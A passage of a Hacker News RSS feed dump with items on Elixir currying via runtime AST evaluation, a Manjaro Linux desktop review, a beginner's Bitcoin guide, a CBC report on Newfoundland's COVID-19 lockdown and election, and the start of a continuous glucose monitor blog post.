iex&gt; Macro.to_string({{:., [], [{:fun, [], nil}]}, [], params})
"fun.(arg1, arg2)"
</code></pre>
<h2>Evaluating the AST</h2>
<p>We now know how to generate the AST for our curried function. For the next step, we need to figure out how to use it!</p>
<p>If you're scared of <a href="https://hexdocs.pm/elixir/Kernel.html#defmacro/2"><code>defmacro/2</code></a> and <a href="https://hexdocs.pm/elixir/Kernel.SpecialForms.html#unquote/1"><code>unquote/1</code></a>, don't worry. We don't need any of that. Everyone knows macros are scary.</p>
<p>You know what's not scary? <em>Runtime evaluation!</em></p>
<p>With <a href="https://hexdocs.pm/elixir/Code.html#eval_quoted/3"><code>Code.eval_quoted/2</code></a>, we should finally be able to write our <code>curry</code> function:</p>
<pre><code>defmodule Func do
  def curry(fun) do
    {:arity, arity} = Function.info(fun, :arity)
    params = Macro.generate_unique_arguments(arity, nil)
    body_ast = {{:., [], [{:fun, [], nil}]}, [], params}

    {curried_fun, _} =
      params
      |&gt; Enum.reverse()
      |&gt; Enum.reduce(body_ast, fn arg, acc -&gt;
        {:fn, [], [{:-&gt;, [], [[arg], acc]}]}
      end)
      |&gt; Code.eval_quoted(fun: fun)

    curried_fun
  end
end
</code></pre>
<p>Does it work?</p>
<pre><code>iex&gt; curried_sum = Func.curry(fn x, y -&gt; x + y end)
#Function&lt;...&gt;
iex&gt; curried_sum.(1).(2)
3
iex&gt; Func.curry(&amp;Map.get/2).(%{foo: "bar"}).(:foo)
"bar"
</code></pre>
<p>It does! 🎉
Who needs macros??</p>

    </article></div>]]>
            </description>
            <link>https://liftm.io/posts/cursed-curried-elixir.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124431</guid>
            <pubDate>Sat, 13 Feb 2021 16:16:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The state of Linux on desktop in 2020]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26123746">thread link</a>) | @tuananh
<br/>
February 13, 2021 | https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/ | <a href="https://web.archive.org/web/*/https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I got fed up with macOS. While the new hardware(Apple Silicon) got amazing feedbacks, the OS itself
is so lag behind.</p>

<p>I got a Windows 10 desktop at home and heck, it was event much more pleasant to use than using macOS.</p>

<ul>
  <li>As a typical user (web browsing, mail and office stuff), Windows 10 is very good.</li>
  <li>As a developer, it’s getting a lot better with WSL/Microsoft Terminal/etc…</li>
</ul>

<p>I decided to give Linux another evaluation test. I pick Manjaro - an Arch-based over an Ubuntu-based 
distro this time after hearing all kind of praise from its users. But I also don’t want to configure
everything I need to use, hence Manjaro.</p>

<blockquote>
  <p>Manjaro is a user-friendly Linux distribution based on the independently developed Arch operating 
system. Within the Linux community, Arch itself is renowned for being an exceptionally fast, 
powerful, and lightweight distribution that provides access to the very latest cutting edge - and 
bleeding edge - software. However, Arch is also aimed at more experienced or technically-minded 
users. As such, it is generally considered to be beyond the reach of those who lack the technical 
expertise (or persistence) required to use it.</p>

  <p>via <a href="https://wiki.manjaro.org/index.php/About_Manjaro">wiki.manjaro.org</a></p>
</blockquote>

<p>So looks like it got the best of both worlds right?</p>

<h2 id="the-test-setup">The test setup</h2>

<p>I built a new mini PC recently. It’s the Asrock Deskmini X300W that use AMD processor. If you prefer
Intel, you can choose the Intel version of the box.</p>

<p>I went with AMD because I like their Zen offering and I would love to support them.</p>

<p>I just throw a 6 cores AMD 4650G processor, 32GB of 3200Mhz Crucial memory, 512GB Samsung NVME drive for 
OS and other stuff plus another 1TB 2.5’ SSD for storage.</p>

<p>For OS, I went with Manjaro KDE variant because I like the look of it.</p>

<h2 id="the-experience">The experience</h2>

<p>Almost everything works out of the box.</p>

<ul>
  <li>
    <p>The graphic works right. I do not have an Intel GPU so it’s much easier for me but I hear 
terrifying stories from other side of the world.</p>
  </li>
  <li>
    <p>WiFi works. Zero complaints here.</p>
  </li>
  <li>
    <p>The bluetooth is almost ok. Most stuff I throw at it works, except an old Xbox One controller of
mine. The one came with Xbox One S works with 1 minor additional step (disable ERTM). I tested with
4 bluetooth mouses, 2 keyboards, 1 speaker and 2 Xbox controllers.</p>
  </li>
  <li>
    <p>Since I pick KDE, it’s a bit troublesome to use setup i3 wm. After reading several tutorials, I 
decided not to bother with one. Instead, I settled with 
<a href="https://github.com/esjeon/krohnkite">krohnkite</a> plugin for KWin. It works really well for my needs
, given that my needs are pretty basic.</p>
  </li>
  <li>
    <p>I do gaming once in awhile and Manjaro even came bundled with Steam (LOL). One might say it’s so
bloat but I’m ok. Storage is cheap these days.</p>
  </li>
  <li>
    <p>Developer experience is awesome. Linux is usually first-class platform for open source projects.
Everything just works. Docker is so fast because no VM required. It’s the best platform for 
developers, hands down.</p>
  </li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>So far, I’m loving it. It does everything I need and works with all the peripherals I have, 
with the exception of the Xbox One controller (wired connection still work though). I’m gonna stick with
Manjaro for now. I don’t see myself moving to Arch since my love for tweaking the system is long
gone. I just want something that works and Manjaro does work very well for me.</p>

  </div></div>]]>
            </description>
            <link>https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123746</guid>
            <pubDate>Sat, 13 Feb 2021 14:24:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Create YouTube playlists without an account (savable as url)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26123256">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://playlists.at/youtube/ | <a href="https://web.archive.org/web/*/https://playlists.at/youtube/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://playlists.at/youtube/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123256</guid>
            <pubDate>Sat, 13 Feb 2021 12:34:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why no one should use AT&T syntax ever, for any reason, under any circumstances]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26122532">thread link</a>) | @moonchild
<br/>
February 13, 2021 | https://elronnd.net/writ/2021-02-13_att-asm.html | <a href="https://web.archive.org/web/*/https://elronnd.net/writ/2021-02-13_att-asm.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://elronnd.net/writ/2021-02-13_att-asm.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122532</guid>
            <pubDate>Sat, 13 Feb 2021 09:38:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner’s Guide to Getting Started with Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 82 (<a href="https://news.ycombinator.com/item?id=26122394">thread link</a>) | @onerom
<br/>
February 13, 2021 | https://serhack.me/articles/getting-started-with-bitcoin/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/getting-started-with-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://serhack.me/images/bitcoin-getting-started/social_oasis.jpg"><figcaption><h4>A man looks for Bitcoin Oasis</h4></figcaption></figure><p>If you have heard about blockchain or cryptocurrency, then the term that initially comes to mind is <a href="https://bitcoin.org/">Bitcoin</a>. Launched 12 years ago, it was the late 2017 bull run that created a media frenzy that propelled Bitcoin into the mainstream and our modern day lexicon.</p><p>Often labeled as the “original” cryptocurrency, <a href="https://bitcoin.org/">Bitcoin</a> has been the catalyst (directly and/or indirectly) behind many new innovations in the blockchain and digital asset space, most notably <a href="https://ethereum.org/">Ethereum</a> and <a href="https://getmonero.org/">Monero</a>. Shortly after the late 2017 bull run lost its steam, interest in these new technologies started to fade ― but here we are in 2021 with Bitcoin having risen like a phoenix from the ashes. As you would assume, an appetite for the blockchain and digital asset space has returned and now it is more important than ever that we understand what exactly is behind this unique asset, Bitcoin.</p><p>This article is meant to be a guide for individuals who are new to cryptocurrency and want to learn about <a href="https://bitcoin.org/">Bitcoin</a>, specifically its use case and the different ways to become involved in the broader blockchain and digital asset space. My goal is to educate you on the basics and make sure that you walk away with a newfound perspective and understanding of <a href="https://bitcoin.org/">Bitcoin</a>.</p><h2 id="what-is-bitcoin">What is Bitcoin?</h2><p>Bitcoin is a peer-to-peer version of electronic cash whose transactions are recorded in a public distributed ledger called a blockchain. In late October 2008, Satoshi Nakamoto (whose identity is still unknown) published a white paper titled <a href="https://bitcoin.org/bitcoin.pdf"><em>Bitcoin: A Peer-to-Peer Electronic Cash System</em></a> on bitcoin.org (registered in August 2008) and subsequently posted it to <a href="https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html">a cryptography mailing list</a>. On January 3, 2009, the Bitcoin network was created when Satoshi Nakamoto mined the initial block of the chain, which is called the genesis block.</p><p>In essence, Bitcoin is a decentralized type of “digital money” that can be used by anyone around the world, at any time, and without restrictions or a central authority. Bitcoin is not backed by any bank or government and originally allowed users to freely send and/or spend it anywhere without trusting third parties.</p><p>At inception, the price of Bitcoin was approximately $0.01 and, as of today, the price has surpassed $40,000 per coin ― with many believing that it can grow exponentially higher to levels between $100,000 and $250,000 in the next year or so.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_1_blockchain-80.jpg"><figcaption><h4>The transactions data are memorized through a chain-of-blocks</h4></figcaption></figure><p>Given that Bitcoin exists and operates within the confounds of the Internet, all user balances are kept on an immutable and fully transparent blockchain. Put simply, each Bitcoin transaction is broadcasted to the Bitcoin network and grouped with several other transactions in the form of a block, which the network’s miners validate. Once the block is accepted, the transactions get recorded on the blockchain (which, as you may recall, is a public ledger). Whenever this process is successfully completed, the network distributes new Bitcoin to miners for each block that has been validated ― this is referred to as a block reward.</p><p>The peculiarity of the blockchain is its distribution and decentralized properties, as all the nodes share a valid copy of the public ledger. In the Bitcoin network, nodes play a very important role ― think of them as “protectors” who are constantly monitoring Bitcoin’s blockchain to distinguish legitimate Bitcoin transactions from illegitimate ones. The basic job of a node is to prevent attempts to double-spend Bitcoins that have already been spent elsewhere. In addition, the process of mining is essential to validating transactions, as it ensures the overall trustworthiness and security of the payment network.</p><h2 id="advantages-and-limitations">Advantages and Limitations</h2><p>Members of the cryptocurrency community, who range from the tech savvy to your average retail investor, have adopted various perspectives regarding the fundamental driver of Bitcoin’s value (both in financial and non-financial terms).</p><p>On one side, there are the Bitcoin Maximalists who believe that Bitcoin is the ultimate financial innovation and will assume a mainstream role in global society ― to maximalists, other cryptocurrencies and traditional financial instruments are inferior. On the other side, you have cryptocurrency enthusiasts who believe Bitcoin’s technology is outdated and that other cryptocurrencies, such as Ethereum, have more expansive utility.</p><p>These arguments and differences of opinion (as it relates to Bitcoin) can often become confusing, so let’s dig deeper into some of the most common discussion points with hopes that you can decipher for yourself.</p><h3 id="advantages">Advantages</h3><ul><li>A blockchain is managed autonomously using <strong>a peer-to-peer network</strong> and cannot be shut down ― the only way to stop it is through shutting down or banning Internet access. (Note: Even though a blockchain or Bitcoin cannot be shut down, some jurisdictions have imposed restrictions on citizens that limit or ban the holding or trading of Bitcoin and/or other cryptocurrencies.)</li><li>There is no need to trust a third party. <strong>You are your own bank!</strong></li><li>Relatively quick and cheap transactions without intermediary fees (around 10 minutes on average per transaction), when compared to most leading cryptocurrencies.</li><li>Increasing adoption by merchants and individuals across the globe.</li><li>Largest market capitalization and name recognition, which will continue to promote its growth and (hopefully) price stability.</li></ul><h3 id="limitations">Limitations</h3><ul><li><strong>Lack of anonymity</strong> as transactions that take place in the Bitcoin network, along with many other leading cryptocurrencies, are fully transparent and can potentially be linked via chain analysis. In addition, strict AML/KYC regulations require many of the leading cryptocurrency trading exchanges to verify your most sensitive personal information.</li><li>Slow and expensive transactions, when compared to lesser known cryptocurrencies that can be sent within seconds and at a fraction of the cost.</li><li>Irreversible transactions. Once a transaction is sent, you cannot undo or cancel the transaction.</li><li>Achievement of its status as a currency will be challenging due to its volatile nature (i.e. swings in price) and regulations.</li><li>The core technology has some subtle limits that make Bitcoin outdated in comparison with other cryptocurrencies.</li></ul><p>Along with Bitcoin Maximalists and cryptocurrency enthusiasts, you have many individuals who simply like to be long-term holders of Bitcoin (because they believe in the fundamentals and value proposition) and others who speculate on the short-term price (e.g. day traders).</p><p>Whatever side you are on, there is no question that Bitcoin has established itself as a serious contender in the financial world and is here to stay for the time being. There may be other alternatives, but the granddaddy of cryptocurrencies still has the spotlight!</p><h2 id="how-to-obtain-bitcoin-from-an-exchange">How to Obtain Bitcoin from an Exchange</h2><p>Now that you have an understanding of Bitcoin and its utility, you may be interested in purchasing some. If that is the case, you have come to the right place as buying it is now easier than ever due to the growing number of exchanges and companies making Bitcoin accessible to the masses.</p><p>Some of the most well-known exchanges that allow you to purchase Bitcoin and other cryptocurrencies are <a href="https://coinbase.com/">Coinbase</a>, <a href="https://www.gemini.com/">Gemini</a>, <a href="https://www.kraken.com/">Kraken</a>, <a href="https://binance.com/">Binance</a>, and <a href="https://www.huobi.com/en-us/">Huobi</a>. While all of these exchanges list Bitcoin, not all of them offer the same cryptocurrencies ― so, it is recommended to open accounts across a few exchanges to ensure that you are provided adequate exposure.</p><p>Once you have created an account on an exchange, you can transfer your local fiat money via ACH or bank wire to the exchange. From there, you can purchase Bitcoin or another cryptocurrency in exchange for your local fiat money. In addition, after purchasing Bitcoin, you can exchange it for another cryptocurrency that you might not be able to purchase with your local fiat money. While some exchanges offer credit card purchases of Bitcoin, please keep in mind that the fees associated with this transaction are typically very high.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_2_exchange-80.jpg"><figcaption><h4>You can exchange central currencies (EUR, USD) to BTC, but sacrificing privacy.</h4></figcaption></figure><p>Using any of the exchanges listed above is the easiest and most convenient way to purchase Bitcoin, as the majority of the other cryptocurrency exchanges do not support fiat currencies. This being the case, you can only exchange other cryptocurrencies (like Ethereum or Monero) for Bitcoin. <a href="https://cash.app/">Cash App</a> and <a href="https://www.paypal.com/us/webapps/mpp/crypto">PayPal</a>, some of the largest financial technology companies, offer its users the ability to purchase Bitcoin. While this is extremely convenient for users of these platforms, the downside for PayPal (not Cash App) is that your Bitcoin must remain on its platform, so you cannot transfer or send it. Remember: Not your keys, not your coins.</p><p>If you are not keen on using any of the methods described above, Bitcoin ATMs are a great alternative. There are over 14,000 physical ATMs worldwide, most of which can be found in major cities at peculiar locations such as a shopping mall, burger restaurant, or a bar. All you need to do is deposit cash and enter your Bitcoin address. Once you have completed the transaction, the funds will be sent to you. This is a very simple process and typically does not require any identity verification, but beware of high fees!</p><h2 id="who-accepts-bitcoin">Who Accepts Bitcoin?</h2><p>Over the years, many individuals and businesses have begun accepting Bitcoin as a form of payment. From time to time, you might have noticed stickers on a shop’s window that says “Bitcoin accepted here.” As mentioned above, after the bull run of late 2017 died down, overall interest in cryptocurrencies (especially Bitcoin) amongst merchants began to wane. Today, Bitcoin and the broader digital asset space has bounced back from a pricing perspective and, with this, so has the interest amongst merchants who have triggered another wave of increased acceptance, most notably <a href="https://apnews.com/article/financial-markets-elon-musk-bitcoin-061817c6795e75d1c3c9e9d6cfc4a911">Tesla</a> disclosing that it has invested approximately $1.5 billion into Bitcoin and that the company plans to accept Bitcoin as payment for its electric vehicles.</p><p>There have been a few prominent …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/getting-started-with-bitcoin/">https://serhack.me/articles/getting-started-with-bitcoin/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/getting-started-with-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122394</guid>
            <pubDate>Sat, 13 Feb 2021 09:02:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coronavirus variant puts Newfoundland back in lockdown]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26121658">thread link</a>) | @graeme
<br/>
February 12, 2021 | https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Newfoundland and Labrador is under full lockdown and Saturday's provincial election will continue with only mail-in voting, officials said Friday, as the province battles the B117 variant of the coronavirus.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5843708.1608137338!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/janice-fitzgerald-dr-jatin-morkar-covid-vaccine.jpg"></p></div><figcaption>Newfoundland and Labrador's chief medical officer of health, Dr. Janice Fitzgerald, has returned the province to lockdown as an outbreak of variant B117 snowballs.<!-- --> <!-- -->(Patrick Butler/Radio-Canada)</figcaption></figure><div><h2><span>Latest</span></h2><ul><li><span>Elections NL cancels in-person voting set for tomorrow, extends special ballot deadline </span></li><li><span>Province-wide lockdown issued, reverting to strict rules last seen in May 2020</span></li><li><span>Top doctor confirms outbreak caused by UK coronavirus variant, B117</span></li><li><span>Newfoundland and Labrador adds 269 active infections in 5 days</span></li></ul></div><p><span><p>Newfoundland and Labrador is under lockdown, and Saturday's provincial election will continue with only mail-in voting, officials said Friday, as the province battles the B117 variant of the coronavirus.</p>  <p>In an emergency briefing&nbsp;Friday evening —&nbsp;the second time officials addressed the province in one day —&nbsp;Dr. Janice Fitzgerald, the chief medical officer of health, said tests had confirmed the&nbsp;widespread presence of B117&nbsp; for the first time.</p>  <p>The "variant of concern" is responsible for this week's mass outbreak in the capital.</p>  <p>Confirmation of the variant's arrival prompted lockdown&nbsp;measures across the province Friday and has suspended in-person voting in the election, delaying the ballot count&nbsp;by at least two weeks.&nbsp;</p>  <p>B117 was first discovered in the United Kingdom. It's believed to be more contagious than the original coronavirus strain.</p>  <p>"We know that if not controlled, it becomes a predominant strain within weeks of first appearance," Fitzgerald said. "This is concerning and serious. But we have the ability to overcome it."</p>  <p>Effective immediately, the entire province is at Alert Level 5, with all but essential businesses closed, Fitzgerald announced.</p>  <p>The decision expands&nbsp;previous measures implemented in the St. John's area this week, returning Newfoundland and Labrador to the same rules it followed for weeks last spring.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/covid-testing-mundy-pond-blizzard.jpg 300w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/covid-testing-mundy-pond-blizzard.jpg 460w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/covid-testing-mundy-pond-blizzard.jpg 620w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/covid-testing-mundy-pond-blizzard.jpg 780w,https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/covid-testing-mundy-pond-blizzard.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5912464.1613155105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/covid-testing-mundy-pond-blizzard.jpg"></p></div><figcaption>COVID-19 testing has spiked this week as Newfoundland and Labrador reports record daily cases.<!-- --> <!-- -->(Submitted by Lisa Warren)</figcaption></figure></span></p>  <p>Nine more cases have been added to the active total since the afternoon briefing, Fitzgerald said. Many of them are teenagers with mild or no symptoms.</p>  <p>There are now 269&nbsp;active cases in the province, with 253&nbsp;of them reported in the past five days.&nbsp;</p>  <p>The outbreak has come as a rude awakening for a province that regularly reported active total caseloads in the single digits, and over the summer survived a 42-day stretch without a single active infection.</p>  <p><em><strong>WATCH | Newfoundland and Labrador moves swiftly into lockdown:&nbsp;</strong></em></p>  <p><span><span><div><div title="Newfoundland and Labrador sees spike in COVID-19 cases" role="button" tabindex="0"><div><div aria-labelledby="1860314691986-metadata-" title="Newfoundland and Labrador sees spike in COVID-19 cases"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/567/351/COVID-NL-CASES-ELEX-YATES-120221.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Newfoundland and Labrador reported Friday that it is dealing with the B117 COVID-19 variant. Some cases are outside the St. John's metro area, showing the outbreak is spreading, and leading to the suspension of in-person voting in Saturday's provincial election.<!-- --> <!-- -->1:50</span></span></span></p>  <p>Most cases, until now, have been linked to travel outside the province.</p>  <p>The province had 390 total cases of&nbsp;COVID-19 in all of 2020.&nbsp;&nbsp;&nbsp;&nbsp;</p>  <h2>Level 5 rules</h2>  <p>Fitzgerald said the discovery of the variant answered questions she had about the speed and scope of the virus's spread. Other provinces are battling the mutation, with experts in Ontario warning B117 could become the dominant strain there before April.</p>  <p>Due to the variant's contagious nature, Fitzgerald said the speed of isolation measures is critical to contain it.</p>  <p>Residents are now expected to remain inside their own homes as much as possible and restrict gatherings to no more than five people.</p>  <p>All non-essential businesses and facilities, including playgrounds, gyms, salons, cinemas, restaurants, bars, private health-care clinics, and retail stores that do not provide the essentials of life, are now closed.</p>  <p>Elective surgery and non-emergent medical treatments are&nbsp;also suspended.</p>  <p><em><strong>Watch the Government of Newfoundland and Labrador briefing:</strong></em></p>  <p><span><span><iframe src="https://www.youtube.com/embed/e68GaBbp81c" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>"At this point, stay in your bubble," Fitzgerald said, simplifying&nbsp;the strict public health directions that Newfoundlanders and Labradorians haven't faced since last May.</p>  <p>"We're back here for a little while. I'm hopeful that we won't have to lock down like we did previously."</p>  <p>Health Minister John Haggie said vaccine rollout will continue as promptly as possible, but the timeline largely depends on delivery schedules, which have proved spotty throughout the country.</p>  <h2>Election day battered by outbreak</h2>  <p>Bruce&nbsp;Chaulk, the province's chief electoral officer, issued a media release immediately after the briefing&nbsp;that he had suspended in-person voting in all 40 districts across the province.</p>  <p>"In-person voting will not be rescheduled," said Bruce&nbsp;Chaulk&nbsp;in a statement. "The election will now shift exclusively to voting by mail."</p>  <p>The deadline to apply for mail-in special ballots has been extended to Feb. 15. Voting packages must be received by Elections NL by March 1.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/andrew-furey-wearing-liberal-red-mask.jpg 300w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/andrew-furey-wearing-liberal-red-mask.jpg 460w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/andrew-furey-wearing-liberal-red-mask.jpg 620w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-furey-wearing-liberal-red-mask.jpg 780w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/andrew-furey-wearing-liberal-red-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-furey-wearing-liberal-red-mask.jpg"></p></div><figcaption>Premier Andrew Furey called the Feb. 13 election last month, and has faced rising criticism over his choice of timing.<!-- --> <!-- -->(Paul Daly)</figcaption></figure></span></p>  <p>The embattled election hasn't weathered the outbreak well,&nbsp;with poll workers resigning en masse,&nbsp;delaying election day for the province's most populated region.</p>  <p>Liberal Leader Andrew Furey, campaigning to reinstate himself in the premier's chair, has repeatedly come under fire for triggering an election prior to widespread vaccine availability.&nbsp;</p>  <p>Furey was compelled by law to call an election within a year of taking over as the head of the Liberal Party, with his deadline in August. When he dropped the writ in January, the province had a steadily low caseload.</p>  <p>As the outbreak worsened this week, Furey repeatedly defended his election timing.</p>  <p>"I haven't given much thought to the election," Furey said Friday evening, prior to Chaulk's announcement and just as news broke of B117's arrival. "I understand there are questions about the election … but we don't have the answers."</p>  <h2>Accountability ahead: opponents</h2>  <p>Fitzgerald said she has spoken with the province's chief electoral officer&nbsp;but would not disclose the advice she gave him when pressed during the briefing, saying it's not her jurisdiction.</p>  <p>Furey's opponents had been calling for an election delay this week&nbsp;and applauded the decision to move to special ballots. NDP Leader Alison Coffin expressed concern, however, that some people may face barriers&nbsp;in registering for mail-in voting by Monday.</p>  <p>"We may see some court challenges come from this," Coffin said. "What I'm more concerned about is how irresponsible Andrew Furey's actions were."</p>  <p>Progressive Conservative Leader Ches Crosbie declined an interview&nbsp;but said in a statement his party would discuss Furey's election timing "another day," saying the public health emergency is the&nbsp;priority.</p>  <p>"Our province deserves a thoughtful conversation about why it took so long for us to reach the right decision in postponing this election and how we hold our political leaders accountable," the statement read.</p>    <p>Earlier on Friday, officials reported 50 new cases of COVID-19, with the vast majority in the St. John's metro region. The province has reported&nbsp;higher-than-average new cases since Monday, when rampant community spread was first identified.</p>  <p>Thousands of people are now in isolation, including 300 health-care workers.</p>  <p><em><strong><a href="https://www.cbc.ca/news/canada/newfoundland-labrador">Read more from CBC Newfoundland and Labrador</a></strong></em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121658</guid>
            <pubDate>Sat, 13 Feb 2021 05:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What a person without diabetes learned from 28 days with a glucose monitor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26121447">thread link</a>) | @jseliger
<br/>
February 12, 2021 | https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor | <a href="https://web.archive.org/web/*/https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header id="header"></header><main id="main"><section id="content-articles" data-ani-anchor="onload"></section><section id="blog-single-content" data-ani-anchor=""><div><div><p>After scary bouts of hypoglycemia as a kid, Blake Reichmann thought he had a solid low-sugar diet. Then a CGM taught him where he could do better.</p></div><div><div><div><div data-bg="/wp-content/uploads/2020/10/bessi-profile.png"> <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20210%20140%22%3E%3C/svg%3E" data-src="https://secure.gravatar.com/avatar/09b375d3b3a726e5e6486b60cc17de94?s=32&amp;d=mm&amp;f=y&amp;r=g"></div></div></div></div><div id="featured-image-single-v"> <img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Patch.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Patch.png" aria-label="The CGM Challenge: What a person without diabetes learned from 28 days with a continuous glucose monitor"></div><div id="single-content-content"><div><p><span>I never thought I’d have a tiny probe stuck in my arm for 28 days. I’m not diabetic or even prediabetic. But when I stumbled on the chance to wear a continuous glucose monitor (CGM) as part of a challenge partnered with Levels, I jumped on it. I’ve been conscious of blood sugar my whole life because I suffered from spells of hypoglycemia as a child.</span></p><p><span>Hypoglycemia is when your blood sugar drops below 70mg/dL. I still don’t know why it happened, but it wasn’t fun. When my glucose levels dropped too low, I’d experience cold sweats, lightheadedness, trembling hands, and an elevated heart rate. These symptoms were likely the result of my body releasing epinephrine (adrenaline) to stabilize my blood glucose.</span></p><p><span>Over the years, I started to pick up on which foods caused my blood sugar to crash. The biggest culprits were cereal for breakfast and sweet tea later in the day. Every time I ate a big bowl of cereal before school (usually Frosted Mini-Wheats or Honey Nut Cheerios), I would crash around 10:30 a.m. like clockwork. Sometimes the crashes were so bad that I thought I might pass out, so I’d call my mom to check me out of school.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg" alt="" width="200" height="200" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg 200w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-400x400.jpg 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture.jpg 512w" data-sizes="(max-width: 200px) 100vw, 200px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg 200w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-400x400.jpg 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture.jpg 512w"></p><p><span>Experiencing low blood sugar not only made it hard to focus but was, quite frankly, a scary experience for someone who didn’t understand what was going on. After missing a few classes from these episodes, my mom decided it was time to change my diet.</span></p><p><span>I went from eating cereal in the mornings to eggs, bacon, and fruit (berries or avocado) and cut out the sweet tea (tough to do for a boy raised in Alabama). Once I made those changes, the crashes stopped, and I had energy throughout the day.</span></p><p><span>At the time, I didn’t fully understand why the switch worked, but I did understand even at a young age that consuming a bunch of carbs and sugar wasn’t good for me. Since then, I’ve become fascinated with maintaining a healthy lifestyle and finding ways to improve 